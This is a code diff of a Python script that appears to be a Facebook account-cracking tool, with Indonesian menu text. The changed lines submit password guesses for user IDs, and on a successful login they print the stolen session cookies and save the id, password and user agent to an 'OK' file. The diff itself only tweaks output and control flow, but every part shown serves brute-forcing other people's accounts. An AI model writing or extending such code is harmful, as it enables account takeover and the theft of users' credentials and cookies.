@@ -563,7 +563,7 @@ def setting():
 		print('>> Pilih Yang Bener Kontooll ')
 		exit()
 	print('>> 1. Mobile ')
-	print('>> 2. Mbasic ')
+	print('>> 2. Mbasic masih update ')
 	print('>> 3. Touch  ')
 #	print('>> 4. Mtouch ')
 	print('')
@@ -629,7 +629,7 @@ def passwrd():
 				for xpwd in pwnya:
 					pwv.append(xpwd)
 			else:pass
-			if 'mobile' in method:
+			elif 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
 				pool.submit(crackfree,idf,pwv)
@@ -683,7 +683,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{H}>> {idf}|{pw}|{kuki}\n{N}')
+				print(f'\r{H}>> {idf}|{pw}|{kuki}|{ua}\n{N}')
 				os.popen('')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
